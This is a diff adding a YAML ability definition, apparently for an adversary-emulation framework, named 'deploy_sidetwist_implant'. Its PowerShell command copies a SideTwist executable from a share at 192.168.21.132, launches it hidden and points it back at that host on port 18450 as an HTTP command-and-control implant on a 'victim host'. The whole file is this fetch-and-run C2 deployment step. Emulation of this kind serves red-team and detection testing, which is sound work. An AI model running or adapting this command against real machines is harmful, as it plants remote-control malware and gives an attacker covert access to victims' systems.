@@ -1,0 +1,29 @@
+---
+- id: e2f21646-bd1c-51d2-8dec-674fa2b31136
+  name: deploy_sidetwist_implant
+  description: Deploy SideTwist HTTP C2 implant to victim host
+  tactic: command-and-control
+  technique_id: T1071.001
+  technique_name: Application Layer Protocol Web Protocols
+  executors:
+  - name: psh
+    platform: windows
+    command: |
+      $runId = $env:C2TRACE_RUN_ID
+      if (-not $runId) { $runId = "sidetwist-default" }
+      $exePath = "C:\Users\Public\c2t_$runId.exe"
+      $xmlPath = "C:\Users\Public\update.xml"
+      Set-Content -Path $xmlPath -Value "sidetwist" -NoNewline
+      Copy-Item -Path "\\192.168.21.132\c2trace\sidetwist-windows.exe" -Destination $exePath -Force
+      Start-Process -FilePath $exePath -ArgumentList "-ip","192.168.21.132","-p","18450","--loop" -WindowStyle Hidden
+      Start-Sleep -Seconds 5
+      Write-Output "SideTwist implant deployed: $exePath"
+    code: null
+    language: null
+    build_target: null
+    payloads: []
+    uploads: []
+    timeout: 60
+    parsers: []
+    cleanup: []
+    variations: []
